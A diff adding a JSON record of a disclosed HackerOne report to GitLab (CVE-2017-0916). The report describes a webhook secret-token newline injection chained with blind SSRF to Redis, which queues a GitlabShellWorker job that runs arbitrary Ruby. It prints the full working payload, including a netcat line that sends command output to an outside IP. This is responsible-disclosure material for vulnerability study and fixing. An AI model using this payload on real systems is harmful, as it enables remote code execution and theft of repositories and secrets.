@@ -1,0 +1,135 @@
+{
+  "id": 299473,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTk0NzM=",
+  "url": "https://hackerone.com/reports/299473",
+  "title": "Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-12-19T21:08:22.970Z",
+  "submitted_at": "2017-12-19T21:08:22.970Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-0916"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-04-27T02:21:14.315Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-04-25T23:40:58.379Z",
+  "team_member_agreed_on_going_public_at": "2018-04-27T02:21:14.226Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The secret token field of a webhook is vulnerable to a new line injection, allowing an attacker to inject non-HTTP commands in a TCP stream. When a GitLab instance is configured with an external Redis instance, e.g. on `127.0.0.1:6379`, it may result in arbitrary code execution on a Sidekiq worker by abusing a blind Server-Side Request Forgery (SSRF) vulnerability in the webhook integration and the new line injection. One of my other reports regarding these SSRFs, #131190, is still open and has been for more than a year. However, because this is a service I haven't reported the SSRF in and chaining it with the new line injection increases the severity of the vulnerability, I decided to report it. To reproduce, start by signing in to the GitLab instance and creating a new project.\n\nTo reproduce the RCE, a Redis server has to be running on port 6379. Follow the GitLab documentation to set up the Redis server and reconfigure GitLab by running `gitlab-ctl reconfigure`. When that's done, continue to go to the Integrations section of the created project. Intercept your network traffic before continuing. Now, enter `http://127.0.0.1:6379/` as the webhook endpoint and `A` as the secret token. When the request is submitted, a request similar to the one below is submitted:\n\n**Request**\n```\nPOST /root/test/hooks HTTP/1.1\nHost: gitlab-instance\n...\n----------1282688597\nContent-Disposition: form-data; name=\"hook[url]\"\n\nhttp://127.0.0.1:6379/\n----------1282688597\nContent-Disposition: form-data; name=\"hook[token]\"\n\nA\n...\n```\n\nIn the request above I changed the body encoding to make it easier to inject the payload. Now, replace the `hook[token]` field with the payload below.\n\n**Payload**\n```\nA\n multi\n sadd resque:gitlab:queues system_hook_push\n lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|whoami | nc 192.241.233.143 80\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"\n exec\n```\n\nThen, when the integration persisted, click the `Test` button next to the newly created integration. Here's what happens next: a `POST` request will be submitted to `127.0.0.1`, port `6379` (Redis). Redis is pretty easy on errors, so it'll simply ignore the first couple lines of the HTTP request. Then, a couple headers further down, it is including the `X-GitLab-Token` that is vulnerable to the new line injection. Here's the entire request that is posted:\n\n**Injected request**\n```\nPOST / HTTP/1.1\nContent-Type: application/json\nX-Gitlab-Event: Push Hook\nX-Gitlab-Token: A\n multi\n sadd resque:gitlab:queues system_hook_push\n lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|whoami | nc 192.241.233.143 80\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"\n exec\n exec\nConnection: close\nHost: 192.241.233.143\nContent-Length: 2495\n\n{\"object_kind\":\"push\",\"ev<...>\n```\n\nWhen this is submitted to Redis, a new job will be shifted on the `system_hook_push` command. In order to evaluate Ruby code, I needed a Ruby class that'd implement the `perform` method that would allow me to execute a command or Ruby. The `GitlabShellWorker` was exactly what I was looking for:\n\n**GitlabShellWorker**\n```ruby\nclass GitlabShellWorker\n  include ApplicationWorker\n  include Gitlab::ShellAdapter\n\n  def perform(action, *arg)\n    gitlab_shell.__send__(action, *arg) # rubocop:disable GitlabSecurity/PublicSend\n  end\nend\n```\n\nAs can be seen in the payload, the `GitlabShellWorker` is called with the arguments `class_eval` and the following Ruby code:\n\n```\nopen('|whoami | nc 192.241.233.143 80').read\n```\n\nBecause the Ruby is evaluated on a Sidekiq server, we need to exfiltrate the output of a command through `nc` or a similar tool. In this example, my server is listening on port 80 for connections. When the payload fires, it captures the output of the `whoami` command:\n\n```\n$ nc -l -n -vv -p 80\nListening on [0.0.0.0] (family 0, port 80)\nConnection from [104.236.178.103] port 80 [tcp/*] accepted (family 2, sport 42874)\ngit\n```\n\nBesides the blind SSRF, the underlying vulnerability is the new line injection in the secret token. Fixing the new line injection seems mitigate the immediate risk for an RCE, but I'd encourage you to reprioritize the fix for the SSRF vulnerabilities in the services (reported by me previously). Let me know if you have any questions.\n\n## Impact\n\nAn attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.",
+  "bounty_amount": "750.0",
+  "formatted_bounty": "$750",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-05-25T23:40:58.471Z",
+  "allow_singular_disclosure_after": -251048608.35574734,
+  "singular_disclosure_allowed": true,
+  "vote_count": 34,
+  "voters": [
+    "jokebookservice1",
+    "sky003",
+    "sp1d3rs",
+    "ramsexy",
+    "bull",
+    "muon4",
+    "jobert",
+    "ali",
+    "bhavukjain1",
+    "michiel",
+    "and 24 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
